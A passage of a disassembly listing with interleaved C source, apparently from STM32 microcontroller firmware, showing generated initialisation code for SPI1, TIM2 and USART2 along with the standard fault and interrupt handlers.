 8000efc:	200003c0 	.word	0x200003c0
 8000f00:	2000026c 	.word	0x2000026c
 8000f04:	55555556 	.word	0x55555556

08000f08 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000f08:	b480      	push	{r7}
 8000f0a:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000f0c:	b672      	cpsid	i
}
 8000f0e:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000f10:	e7fe      	b.n	8000f10 <Error_Handler+0x8>
	...

08000f14 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000f14:	b580      	push	{r7, lr}
 8000f16:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000f18:	4b1b      	ldr	r3, [pc, #108]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f1a:	4a1c      	ldr	r2, [pc, #112]	; (8000f8c <MX_SPI1_Init+0x78>)
 8000f1c:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000f1e:	4b1a      	ldr	r3, [pc, #104]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f20:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000f24:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000f26:	4b18      	ldr	r3, [pc, #96]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f28:	2200      	movs	r2, #0
 8000f2a:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000f2c:	4b16      	ldr	r3, [pc, #88]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f2e:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000f32:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000f34:	4b14      	ldr	r3, [pc, #80]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f36:	2200      	movs	r2, #0
 8000f38:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000f3a:	4b13      	ldr	r3, [pc, #76]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f3c:	2200      	movs	r2, #0
 8000f3e:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000f40:	4b11      	ldr	r3, [pc, #68]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f42:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000f46:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000f48:	4b0f      	ldr	r3, [pc, #60]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f4a:	2228      	movs	r2, #40	; 0x28
 8000f4c:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000f4e:	4b0e      	ldr	r3, [pc, #56]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f50:	2200      	movs	r2, #0
 8000f52:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000f54:	4b0c      	ldr	r3, [pc, #48]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f56:	2200      	movs	r2, #0
 8000f58:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000f5a:	4b0b      	ldr	r3, [pc, #44]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f5c:	2200      	movs	r2, #0
 8000f5e:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000f60:	4b09      	ldr	r3, [pc, #36]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f62:	2207      	movs	r2, #7
 8000f64:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000f66:	4b08      	ldr	r3, [pc, #32]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f68:	2200      	movs	r2, #0
 8000f6a:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000f6c:	4b06      	ldr	r3, [pc, #24]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f6e:	2208      	movs	r2, #8
 8000f70:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000f72:	4805      	ldr	r0, [pc, #20]	; (8000f88 <MX_SPI1_Init+0x74>)
 8000f74:	f003 ff14 	bl	8004da0 <HAL_SPI_Init>
 8000f78:	4603      	mov	r3, r0
 8000f7a:	2b00      	cmp	r3, #0
 8000f7c:	d001      	beq.n	8000f82 <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000f7e:	f7ff ffc3 	bl	8000f08 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000f82:	bf00      	nop
 8000f84:	bd80      	pop	{r7, pc}
 8000f86:	bf00      	nop
 8000f88:	20000280 	.word	0x20000280
 8000f8c:	40013000 	.word	0x40013000

08000f90 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000f90:	b580      	push	{r7, lr}
 8000f92:	b08a      	sub	sp, #40	; 0x28
 8000f94:	af00      	add	r7, sp, #0
 8000f96:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000f98:	f107 0314 	add.w	r3, r7, #20
 8000f9c:	2200      	movs	r2, #0
 8000f9e:	601a      	str	r2, [r3, #0]
 8000fa0:	605a      	str	r2, [r3, #4]
 8000fa2:	609a      	str	r2, [r3, #8]
 8000fa4:	60da      	str	r2, [r3, #12]
 8000fa6:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000fa8:	687b      	ldr	r3, [r7, #4]
 8000faa:	681b      	ldr	r3, [r3, #0]
 8000fac:	4a17      	ldr	r2, [pc, #92]	; (800100c <HAL_SPI_MspInit+0x7c>)
 8000fae:	4293      	cmp	r3, r2
 8000fb0:	d128      	bne.n	8001004 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000fb2:	4b17      	ldr	r3, [pc, #92]	; (8001010 <HAL_SPI_MspInit+0x80>)
 8000fb4:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000fb6:	4a16      	ldr	r2, [pc, #88]	; (8001010 <HAL_SPI_MspInit+0x80>)
 8000fb8:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000fbc:	6613      	str	r3, [r2, #96]	; 0x60
 8000fbe:	4b14      	ldr	r3, [pc, #80]	; (8001010 <HAL_SPI_MspInit+0x80>)
 8000fc0:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000fc2:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000fc6:	613b      	str	r3, [r7, #16]
 8000fc8:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000fca:	4b11      	ldr	r3, [pc, #68]	; (8001010 <HAL_SPI_MspInit+0x80>)
 8000fcc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000fce:	4a10      	ldr	r2, [pc, #64]	; (8001010 <HAL_SPI_MspInit+0x80>)
 8000fd0:	f043 0301 	orr.w	r3, r3, #1
 8000fd4:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000fd6:	4b0e      	ldr	r3, [pc, #56]	; (8001010 <HAL_SPI_MspInit+0x80>)
 8000fd8:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000fda:	f003 0301 	and.w	r3, r3, #1
 8000fde:	60fb      	str	r3, [r7, #12]
 8000fe0:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000fe2:	23c2      	movs	r3, #194	; 0xc2
 8000fe4:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000fe6:	2302      	movs	r3, #2
 8000fe8:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000fea:	2300      	movs	r3, #0
 8000fec:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000fee:	2303      	movs	r3, #3
 8000ff0:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000ff2:	2305      	movs	r3, #5
 8000ff4:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000ff6:	f107 0314 	add.w	r3, r7, #20
 8000ffa:	4619      	mov	r1, r3
 8000ffc:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8001000:	f000 fdd4 	bl	8001bac <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8001004:	bf00      	nop
 8001006:	3728      	adds	r7, #40	; 0x28
 8001008:	46bd      	mov	sp, r7
 800100a:	bd80      	pop	{r7, pc}
 800100c:	40013000 	.word	0x40013000
 8001010:	40021000 	.word	0x40021000

08001014 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8001014:	b480      	push	{r7}
 8001016:	b083      	sub	sp, #12
 8001018:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 800101a:	4b0f      	ldr	r3, [pc, #60]	; (8001058 <HAL_MspInit+0x44>)
 800101c:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 800101e:	4a0e      	ldr	r2, [pc, #56]	; (8001058 <HAL_MspInit+0x44>)
 8001020:	f043 0301 	orr.w	r3, r3, #1
 8001024:	6613      	str	r3, [r2, #96]	; 0x60
 8001026:	4b0c      	ldr	r3, [pc, #48]	; (8001058 <HAL_MspInit+0x44>)
 8001028:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 800102a:	f003 0301 	and.w	r3, r3, #1
 800102e:	607b      	str	r3, [r7, #4]
 8001030:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8001032:	4b09      	ldr	r3, [pc, #36]	; (8001058 <HAL_MspInit+0x44>)
 8001034:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001036:	4a08      	ldr	r2, [pc, #32]	; (8001058 <HAL_MspInit+0x44>)
 8001038:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 800103c:	6593      	str	r3, [r2, #88]	; 0x58
 800103e:	4b06      	ldr	r3, [pc, #24]	; (8001058 <HAL_MspInit+0x44>)
 8001040:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001042:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8001046:	603b      	str	r3, [r7, #0]
 8001048:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 800104a:	bf00      	nop
 800104c:	370c      	adds	r7, #12
 800104e:	46bd      	mov	sp, r7
 8001050:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001054:	4770      	bx	lr
 8001056:	bf00      	nop
 8001058:	40021000 	.word	0x40021000

0800105c <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 800105c:	b480      	push	{r7}
 800105e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8001060:	e7fe      	b.n	8001060 <NMI_Handler+0x4>

08001062 <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8001062:	b480      	push	{r7}
 8001064:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8001066:	e7fe      	b.n	8001066 <HardFault_Handler+0x4>

08001068 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8001068:	b480      	push	{r7}
 800106a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 800106c:	e7fe      	b.n	800106c <MemManage_Handler+0x4>

0800106e <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 800106e:	b480      	push	{r7}
 8001070:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8001072:	e7fe      	b.n	8001072 <BusFault_Handler+0x4>

08001074 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8001074:	b480      	push	{r7}
 8001076:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8001078:	e7fe      	b.n	8001078 <UsageFault_Handler+0x4>

0800107a <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 800107a:	b480      	push	{r7}
 800107c:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 800107e:	bf00      	nop
 8001080:	46bd      	mov	sp, r7
 8001082:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001086:	4770      	bx	lr

08001088 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8001088:	b480      	push	{r7}
 800108a:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 800108c:	bf00      	nop
 800108e:	46bd      	mov	sp, r7
 8001090:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001094:	4770      	bx	lr

08001096 <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8001096:	b480      	push	{r7}
 8001098:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 800109a:	bf00      	nop
 800109c:	46bd      	mov	sp, r7
 800109e:	f85d 7b04 	ldr.w	r7, [sp], #4
 80010a2:	4770      	bx	lr

080010a4 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 80010a4:	b580      	push	{r7, lr}
 80010a6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 80010a8:	f000 f9b2 	bl	8001410 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 80010ac:	bf00      	nop
 80010ae:	bd80      	pop	{r7, pc}

080010b0 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 80010b0:	b580      	push	{r7, lr}
 80010b2:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 80010b4:	4802      	ldr	r0, [pc, #8]	; (80010c0 <TIM2_IRQHandler+0x10>)
 80010b6:	f003 ffc1 	bl	800503c <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 80010ba:	bf00      	nop
 80010bc:	bd80      	pop	{r7, pc}
 80010be:	bf00      	nop
 80010c0:	200002e4 	.word	0x200002e4

080010c4 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 80010c4:	b580      	push	{r7, lr}
 80010c6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 80010c8:	4802      	ldr	r0, [pc, #8]	; (80010d4 <USB_IRQHandler+0x10>)
 80010ca:	f001 f819 	bl	8002100 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 80010ce:	bf00      	nop
 80010d0:	bd80      	pop	{r7, pc}
 80010d2:	bf00      	nop
 80010d4:	20000b7c 	.word	0x20000b7c

080010d8 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 80010d8:	b480      	push	{r7}
 80010da:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 80010dc:	4b06      	ldr	r3, [pc, #24]	; (80010f8 <SystemInit+0x20>)
 80010de:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80010e2:	4a05      	ldr	r2, [pc, #20]	; (80010f8 <SystemInit+0x20>)
 80010e4:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 80010e8:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 80010ec:	bf00      	nop
 80010ee:	46bd      	mov	sp, r7
 80010f0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80010f4:	4770      	bx	lr
 80010f6:	bf00      	nop
 80010f8:	e000ed00 	.word	0xe000ed00

080010fc <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 80010fc:	b580      	push	{r7, lr}
 80010fe:	b088      	sub	sp, #32
 8001100:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8001102:	f107 0310 	add.w	r3, r7, #16
 8001106:	2200      	movs	r2, #0
 8001108:	601a      	str	r2, [r3, #0]
 800110a:	605a      	str	r2, [r3, #4]
 800110c:	609a      	str	r2, [r3, #8]
 800110e:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8001110:	1d3b      	adds	r3, r7, #4
 8001112:	2200      	movs	r2, #0
 8001114:	601a      	str	r2, [r3, #0]
 8001116:	605a      	str	r2, [r3, #4]
 8001118:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 800111a:	4b1e      	ldr	r3, [pc, #120]	; (8001194 <MX_TIM2_Init+0x98>)
 800111c:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8001120:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8001122:	4b1c      	ldr	r3, [pc, #112]	; (8001194 <MX_TIM2_Init+0x98>)
 8001124:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8001128:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 800112a:	4b1a      	ldr	r3, [pc, #104]	; (8001194 <MX_TIM2_Init+0x98>)
 800112c:	2200      	movs	r2, #0
 800112e:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8001130:	4b18      	ldr	r3, [pc, #96]	; (8001194 <MX_TIM2_Init+0x98>)
 8001132:	f240 128f 	movw	r2, #399	; 0x18f
 8001136:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8001138:	4b16      	ldr	r3, [pc, #88]	; (8001194 <MX_TIM2_Init+0x98>)
 800113a:	2200      	movs	r2, #0
 800113c:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 800113e:	4b15      	ldr	r3, [pc, #84]	; (8001194 <MX_TIM2_Init+0x98>)
 8001140:	2200      	movs	r2, #0
 8001142:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8001144:	4813      	ldr	r0, [pc, #76]	; (8001194 <MX_TIM2_Init+0x98>)
 8001146:	f003 fece 	bl	8004ee6 <HAL_TIM_Base_Init>
 800114a:	4603      	mov	r3, r0
 800114c:	2b00      	cmp	r3, #0
 800114e:	d001      	beq.n	8001154 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8001150:	f7ff feda 	bl	8000f08 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8001154:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8001158:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 800115a:	f107 0310 	add.w	r3, r7, #16
 800115e:	4619      	mov	r1, r3
 8001160:	480c      	ldr	r0, [pc, #48]	; (8001194 <MX_TIM2_Init+0x98>)
 8001162:	f004 f86d 	bl	8005240 <HAL_TIM_ConfigClockSource>
 8001166:	4603      	mov	r3, r0
 8001168:	2b00      	cmp	r3, #0
 800116a:	d001      	beq.n	8001170 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 800116c:	f7ff fecc 	bl	8000f08 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8001170:	2300      	movs	r3, #0
 8001172:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 8001174:	2300      	movs	r3, #0
 8001176:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8001178:	1d3b      	adds	r3, r7, #4
 800117a:	4619      	mov	r1, r3
 800117c:	4805      	ldr	r0, [pc, #20]	; (8001194 <MX_TIM2_Init+0x98>)
 800117e:	f004 fa4f 	bl	8005620 <HAL_TIMEx_MasterConfigSynchronization>
 8001182:	4603      	mov	r3, r0
 8001184:	2b00      	cmp	r3, #0
 8001186:	d001      	beq.n	800118c <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8001188:	f7ff febe 	bl	8000f08 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 800118c:	bf00      	nop
 800118e:	3720      	adds	r7, #32
 8001190:	46bd      	mov	sp, r7
 8001192:	bd80      	pop	{r7, pc}
 8001194:	200002e4 	.word	0x200002e4

08001198 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8001198:	b580      	push	{r7, lr}
 800119a:	b084      	sub	sp, #16
 800119c:	af00      	add	r7, sp, #0
 800119e:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 80011a0:	687b      	ldr	r3, [r7, #4]
 80011a2:	681b      	ldr	r3, [r3, #0]
 80011a4:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80011a8:	d113      	bne.n	80011d2 <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 80011aa:	4b0c      	ldr	r3, [pc, #48]	; (80011dc <HAL_TIM_Base_MspInit+0x44>)
 80011ac:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80011ae:	4a0b      	ldr	r2, [pc, #44]	; (80011dc <HAL_TIM_Base_MspInit+0x44>)
 80011b0:	f043 0301 	orr.w	r3, r3, #1
 80011b4:	6593      	str	r3, [r2, #88]	; 0x58
 80011b6:	4b09      	ldr	r3, [pc, #36]	; (80011dc <HAL_TIM_Base_MspInit+0x44>)
 80011b8:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80011ba:	f003 0301 	and.w	r3, r3, #1
 80011be:	60fb      	str	r3, [r7, #12]
 80011c0:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 80011c2:	2200      	movs	r2, #0
 80011c4:	2100      	movs	r1, #0
 80011c6:	201c      	movs	r0, #28
 80011c8:	f000 fa41 	bl	800164e <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 80011cc:	201c      	movs	r0, #28
 80011ce:	f000 fa5a 	bl	8001686 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 80011d2:	bf00      	nop
 80011d4:	3710      	adds	r7, #16
 80011d6:	46bd      	mov	sp, r7
 80011d8:	bd80      	pop	{r7, pc}
 80011da:	bf00      	nop
 80011dc:	40021000 	.word	0x40021000

080011e0 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 80011e0:	b580      	push	{r7, lr}
 80011e2:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 80011e4:	4b14      	ldr	r3, [pc, #80]	; (8001238 <MX_USART2_UART_Init+0x58>)
 80011e6:	4a15      	ldr	r2, [pc, #84]	; (800123c <MX_USART2_UART_Init+0x5c>)
 80011e8:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 80011ea:	4b13      	ldr	r3, [pc, #76]	; (8001238 <MX_USART2_UART_Init+0x58>)
 80011ec:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 80011f0:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 80011f2:	4b11      	ldr	r3, [pc, #68]	; (8001238 <MX_USART2_UART_Init+0x58>)
 80011f4:	2200      	movs	r2, #0
 80011f6:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 80011f8:	4b0f      	ldr	r3, [pc, #60]	; (8001238 <MX_USART2_UART_Init+0x58>)
 80011fa:	2200      	movs	r2, #0
 80011fc:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 80011fe:	4b0e      	ldr	r3, [pc, #56]	; (8001238 <MX_USART2_UART_Init+0x58>)
 8001200:	2200      	movs	r2, #0
 8001202:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8001204:	4b0c      	ldr	r3, [pc, #48]	; (8001238 <MX_USART2_UART_Init+0x58>)
 8001206:	220c      	movs	r2, #12
 8001208:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 800120a:	4b0b      	ldr	r3, [pc, #44]	; (8001238 <MX_USART2_UART_Init+0x58>)
 800120c:	2200      	movs	r2, #0
 800120e:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8001210:	4b09      	ldr	r3, [pc, #36]	; (8001238 <MX_USART2_UART_Init+0x58>)
 8001212:	2200      	movs	r2, #0
 8001214:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 8001216:	4b08      	ldr	r3, [pc, #32]	; (8001238 <MX_USART2_UART_Init+0x58>)
 8001218:	2200      	movs	r2, #0
 800121a:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 800121c:	4b06      	ldr	r3, [pc, #24]	; (8001238 <MX_USART2_UART_Init+0x58>)
 800121e:	2200      	movs	r2, #0
 8001220:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8001222:	4805      	ldr	r0, [pc, #20]	; (8001238 <MX_USART2_UART_Init+0x58>)
 8001224:	f004 fa80 	bl	8005728 <HAL_UART_Init>
 8001228:	4603      	mov	r3, r0
 800122a:	2b00      	cmp	r3, #0
